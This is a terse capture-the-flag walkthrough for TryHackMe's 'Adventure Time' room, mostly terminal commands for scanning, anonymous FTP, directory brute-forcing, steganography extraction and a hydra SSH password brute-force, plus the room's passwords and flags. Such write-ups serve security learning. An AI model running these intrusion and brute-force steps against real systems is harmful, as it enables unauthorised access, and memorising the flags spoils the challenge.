...
```
bibo318@parrot:~/CTFs/tryhackme/Adventure Time$ sudo nmap -p- -Pn -sS -sC -sV -O 10.10.184.31
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-07 20:05 CEST
Nmap scan report for 10.10.184.31
...
```
bibo318@parrot:~/CTFs/tryhackme/Adventure Time$ ftp 10.10.184.31
Connected to 10.10.184.31.
220 (vsFTPd 3.0.3)
Name (10.10.184.31:kali): anonymous
...
```
bibo318@parrot:~/CTFs/tryhackme/Adventure Time$ for i in {1..6}; do exiftool $i.jpg | grep "XP Comment" | cut -d ":" -f2;done
...
- [https://10.10.184.31/](https://10.10.184.31/)
...
```
bibo318@parrot:~/CTFs/tryhackme/Adventure Time$ gobuster dir -u https://192.168.245.132 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k -f -s 200
===============================================================
Gobuster v3.0.1
...
Add `10.10.184.31 land-of-ooo.com adventure-time.com` to `/etc/hosts`
...
```
bibo318@parrot:~/CTFs/tryhackme/Adventure Time$ gobuster dir -u https://land-of-ooo.com -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k -f -s 200
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
...
```
bibo318@parrot:~/CTFs/tryhackme/Adventure Time$ gobuster dir -u https://land-of-ooo.com/yellowdog/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k -f -s 200
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
...
```
bibo318@parrot:~/CTFs/tryhackme/Adventure Time$ gobuster dir -u https://land-of-ooo.com/yellowdog/bananastock/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k -f -s 200
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
...
```
bibo318@parrot:~/CTFs/tryhackme/Adventure Time$ nc 10.10.201.194 31337
Hello Princess Bubblegum. What is the magic word?
ricardio
...
```
bibo318@parrot:~/CTFs/tryhackme/Adventure Time$ ssh apple-guards@10.10.201.194
...
```
bibo318@parrot:~/CTFs/tryhackme/Adventure Time$ nc 10.10.201.194 31337Hello Princess Bubblegum. What is the magic word?
ApplePie
The password of peppermint-butler is: That Black Magic

bibo318@parrot:~/CTFs/tryhackme/Adventure Time$
```
...
```
bibo318@parrot:~/CTFs/tryhackme/Adventure Time$ scp peppermint-butler@10.10.217.61:/home/peppermint-butler/butler-1.jpg .
...
```
bibo318@parrot:~/CTFs/tryhackme/Adventure Time$ steghide extract -sf butler-1.jpg
Enter passphrase:
wrote extracted data to "secrets.zip".
bibo318@parrot:~/CTFs/tryhackme/Adventure Time$ unzip secrets.zip
Archive:  secrets.zip
[secrets.zip] secrets.txt password:
 extracting: secrets.txt
bibo318@parrot:~/CTFs/tryhackme/Adventure Time$ cat secrets.txt
...
```
bibo318@parrot:~/CTFs/tryhackme/Adventure Time$ hydra -l gunter -P passwords.txt ssh://10.10.19.177
...
`tryhackme{Th1s1sJustTh3St4rt12**123:))}`
...
`tryhackme{N0Bl4ckM4g1cH3r312**123:))}`
